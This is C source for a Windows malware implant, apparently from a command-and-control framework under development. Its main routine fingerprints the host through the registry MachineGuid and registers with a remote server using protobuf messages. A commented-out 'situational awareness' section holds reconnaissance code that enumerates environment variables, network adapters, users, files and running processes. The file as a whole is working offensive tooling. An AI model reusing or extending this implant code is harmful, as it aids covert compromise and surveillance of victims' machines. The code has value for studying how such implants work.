#define PB_ENABLE_MALLOC 1
#include "debug.h"

#include "implant.h"

#include <windows.h>

#include "execute.h"

#include "http_client.h"

#include <stdio.h>
#include <string.h>
#include <iphlpapi.h>

#include <pb_encode.h>
#include <pb_decode.h>
#include "implant.pb.h"

LPBYTE ImplantID_PT1 = NULL; // MachineGUID
LPBYTE ImplantID_PT2 = NULL; // RandomBytes
LPBYTE ImplantID = NULL; // MachineGUID + RandomBytes

// Function to RegisterImplant message
BYTE *EncodeRegisterImplant(RegisterImplant *ri, size_t *bufferSize) {
	bool status = pb_get_encoded_size(bufferSize, RegisterImplant_fields, ri);
	if (!status) {
		DEBUG_PRINTF("Failed to get RegisterImplant size: \n");
		return NULL;
	}
	
	BYTE *registerBuffer = (BYTE *)malloc(*bufferSize);
	pb_ostream_t stream = pb_ostream_from_buffer(registerBuffer, *bufferSize);
	
	status = pb_encode(&stream, RegisterImplant_fields, ri);
	
	if (!status) {
		DEBUG_PRINTF("Encoding failed: %s\n", PB_GET_ERROR(&stream));
		free(registerBuffer);
		return NULL;
	}

        DEBUG_PRINTF("[+] Successfully encoded: %llu\n", stream.bytes_written);
	return registerBuffer;
}

int GetMachineGUID() {
	DWORD dwSize = 0;

	RegGetValueA(HKEY_LOCAL_MACHINE,
                        "SOFTWARE\\Microsoft\\Cryptography",
                        "MachineGuid",
                        RRF_RT_REG_SZ,
                        NULL,
                        NULL,
                        &dwSize);
	
	ImplantID_PT1 = malloc(dwSize);

	LONG res = RegGetValueA(HKEY_LOCAL_MACHINE,
			"SOFTWARE\\Microsoft\\Cryptography",
			"MachineGuid",
			RRF_RT_REG_SZ,
			NULL,
			ImplantID_PT1,
			&dwSize);

	if (res) {
		DEBUG_PRINTF("Failed to get MachineGUID\n");
		return 1;
	}
	return 0;
}

BYTE *GenerateRandomBytes() {
	HCRYPTPROV hCryptProv;
	
	if (!CryptAcquireContext(&hCryptProv,
				NULL,
				NULL,
				PROV_RSA_FULL,
				CRYPT_VERIFYCONTEXT)) {
		DEBUG_PRINTF("Error acquiring cryptographic context.\n");
		return NULL;
	}

	BYTE *randomBytes = (BYTE *)malloc(RANDOM_BYTES_SIZE);
	if (!CryptGenRandom(hCryptProv,
				RANDOM_BYTES_SIZE,
				randomBytes)) {
		DEBUG_PRINTF("Error generating random bytes.\n");
		CryptReleaseContext(hCryptProv, 0);
		return NULL;
	}
	CryptReleaseContext(hCryptProv, 0);

	return randomBytes;
}

int BytesToHexString(const BYTE *bytes) {
	if (bytes == NULL) {
		return 1;
	}
	
	ImplantID_PT2 = malloc(HEX_STRING_SIZE);
	const char *hexChars = "0123456789abcdef";
	for (int i = 0; i < RANDOM_BYTES_SIZE; i++) {
		ImplantID_PT2[i * 2] = hexChars[bytes[i] >> 4];
		ImplantID_PT2[i * 2 + 1] = hexChars[bytes[i] & 0x0F];
	}
	ImplantID_PT2[HEX_STRING_SIZE - 1] = '\0';

	return 0;
}

char* concat(const char *s1, const char *s2) {
    const size_t len1 = strlen(s1);
    const size_t len2 = strlen(s2);
    char *result = malloc(len1 + len2 + 1); // +1 for the null-terminator
    // in real code you would check for errors in malloc here
    memcpy(result, s1, len1);
    memcpy(result + len1, s2, len2 + 1); // +1 to copy the null-terminator
    return result;
}

// Function to set the ImplantID using the machine's GUID
char *SetID() {

	if (GetMachineGUID() == 1) {
		DEBUG_PRINTF("MachineID is not set...\n");
	}

	if (BytesToHexString(GenerateRandomBytes()) == 1) {
		DEBUG_PRINTF("RandomBytes is NULL...\n");
        }

	// DEBUG_PRINTF("ImplantID_PT1 = %s\n", ImplantID_PT1);
	// DEBUG_PRINTF("ImplantID_PT2 = %s\n", ImplantID_PT2);

	ImplantID = (LPBYTE )concat((const char *)ImplantID_PT1, (const char *)ImplantID_PT2);

	return (char *)ImplantID;
}

// Function to register Implant with the Server
int RegisterSelf() {
	RegisterImplant ri = RegisterImplant_init_zero;

	ri.GUID = SetID();
	DEBUG_PRINTF("IMPLANT GUID = %s\n", ri.GUID);

	ri.Hostname = "test" ;
	ri.Username = "userwoozer";
	ri.Password = "pass";

	size_t bufferSize = 0;
	BYTE *registerBuffer = EncodeRegisterImplant(&ri, &bufferSize);
	
	LPBYTE response = SendToServer(POST_VERB, REGISTER_PATH, registerBuffer, bufferSize);
	
	if (response == NULL){
                DEBUG_PRINTF("Bad response.");
                DEBUG_PRINTF("response = %s", response);
        }
	
	return 0;
}


int main() {
	DEBUG_PRINTF("Starting Implant.\n");
	
	int result = RegisterSelf();

	if (result == 1) {
		DEBUG_PRINTF("Failed to register with the Server!\n");
		return 1;
	}
	printf("[+] Successfully registered Implant with Server!\n");

	return 0;
}

/**
//SITUATIONAL AWARENESS

// Function to gather and print environment variables

//read environment variables
void getEnvironmentVariables() {
    // Pointer to hold the environment variables
    LPTSTR lpEnvironment = GetEnvironmentStrings();
    if (lpEnvironment == NULL) {
        printf("Failed to retrieve environment variables\n");
        return;
    }

    // Iterate over each environment variable
    LPTSTR lpszVariable = lpEnvironment;
    while (*lpszVariable != TEXT('\0')) {
        // Find the end of the variable name and the beginning of its value
        LPTSTR lpszEqualSign = _tcschr(lpszVariable, TEXT('='));
        if (lpszEqualSign != NULL) {
            // Copy the variable name
            TCHAR variable[MAX_PATH];
            int length = lpszEqualSign - lpszVariable;
            _tcsncpy_s(variable, MAX_PATH, lpszVariable, length);
            variable[length] = TEXT('\0');

            // Print the variable name and value
            _tprintf(TEXT("%s: %s\n"), variable, lpszEqualSign + 1);
        }

        // Move to the next environment variable
        lpszVariable += lstrlen(lpszVariable) + 1;
    }

    // Free the environment block
    FreeEnvironmentStrings(lpEnvironment);
}


// Function to gather and print network interfaces
void getNetworkInterfaces() {
    // Variable to store the result of the GetAdaptersAddresses function
    ULONG result = 0;

    // Variable to hold the buffer size needed for the adapter information
    ULONG buffer_size = 0;

    // Call GetAdaptersAddresses with a NULL buffer to get the required buffer size
    result = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &buffer_size);
    if (result != ERROR_BUFFER_OVERFLOW) {
        printf("Error getting buffer size for adapter information\n");
        return;
    }

    // Allocate memory for the adapter information buffer
    IP_ADAPTER_ADDRESSES *adapter_addresses = (IP_ADAPTER_ADDRESSES *)malloc(buffer_size);
    if (adapter_addresses == NULL) {
        printf("Memory allocation failed for adapter information\n");
        return;
    }

    // Call GetAdaptersAddresses again to retrieve the adapter information
    result = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, adapter_addresses, &buffer_size);
    if (result != NO_ERROR) {
        printf("Error getting adapter information\n");
        free(adapter_addresses);
        return;
    }

    // Iterate over the adapter information and print relevant details
    for (IP_ADAPTER_ADDRESSES *adapter = adapter_addresses; adapter != NULL; adapter = adapter->Next) {
        printf("Adapter Name: %ws\n", adapter->AdapterName);
        printf("Description: %ws\n", adapter->Description);
        printf("IPv4 Address: ");
        if (adapter->FirstUnicastAddress != NULL && adapter->FirstUnicastAddress->Address.lpSockaddr != NULL) {
            printf("%s\n", inet_ntoa(((struct sockaddr_in *)adapter->FirstUnicastAddress->Address.lpSockaddr)->sin_addr));
        } else {
            printf("None\n");
        }
        printf("IPv6 Address: ");
        if (adapter->FirstUnicastAddress != NULL && adapter->FirstUnicastAddress->Next != NULL) {
            printf("%s\n", inet_ntoa(((struct sockaddr_in *)adapter->FirstUnicastAddress->Next->Address.lpSockaddr)->sin_addr));
        } else {
            printf("None\n");
        }
        printf("\n");
    }

    // Free the memory allocated for the adapter information
    free(adapter_addresses);
}

//get the windows version 
void getSystemVersion() {
    OSVERSIONINFOEX osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

    if (GetVersionEx((OSVERSIONINFO *)&osvi)) {
        printf("Operating System Version: %d.%d\n", osvi.dwMajorVersion, osvi.dwMinorVersion);
        printf("Build Number: %d\n", osvi.dwBuildNumber);
    } else {
        printf("Failed to retrieve system version information.\n");
    }
}

//to get the current user and token (is this getting the token??)
void getCurrentUser() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;

    if (GetUserName(username, &username_len)) {
        printf("Current User: %s\n", username);
    } else {
        printf("Failed to retrieve current user information.\n");
    }
}

// Function to get computer name
void getComputerName() {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1]; 
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;

    if (GetComputerName(computerName, &size)) {
        printf("Computer Name: %s\n", computerName);
    } else {
        printf("Failed to retrieve computer name.\n");
    }
}

//get machine GUID
void getMachineGUID() {
    HW_PROFILE_INFO hwProfileInfo;
    if (GetCurrentHwProfileA(&hwProfileInfo) != NULL) {
        printf("Machine GUID: %s\n", hwProfileInfo.szHwProfileGuid);
    } else {
        printf("Failed to retrieve machine GUID\n");
    }
}

// Function to list files in a directory
void listFilesInDirectory(const char *path) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind;

    // Prepare the search path
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s\\*", path);

    // Find the first file in the directory
    hFind = FindFirstFile(searchPath, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Error opening directory: %s\n", path);
        return;
    }

    // Iterate through all files in the directory
    do {
        // Skip directories
        if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            printf("%s\n", findFileData.cFileName);
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    // Close the search handle
    FindClose(hFind);
}

//change current directory
bool ChangeDirectory(const char *path) {
    if (SetCurrentDirectory(path)) {
        return true; // Directory change successful
    } else {
        return false; // Directory change failed
    }
}

// Function to enumerate and print running processes
void listRunningProcesses() {
    DWORD count;
    PWTS_PROCESS_INFOA pProcessInfo;

    // Get the list of processes on the terminal server
    if (!WTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pProcessInfo, &count)) {
        printf("Failed to enumerate processes on terminal server\n");
        return;
    }

    // Iterate through the processes and print information
    for (DWORD i = 0; i < count; i++) {
        printf("Process ID: %d, Session ID: %d, Process Name: %s\n",
               pProcessInfo[i].ProcessId, pProcessInfo[i].SessionId, pProcessInfo[i].pProcessName);
    }

    // Free the memory allocated for the process information
    WTSFreeMemory(pProcessInfo);
}

**/
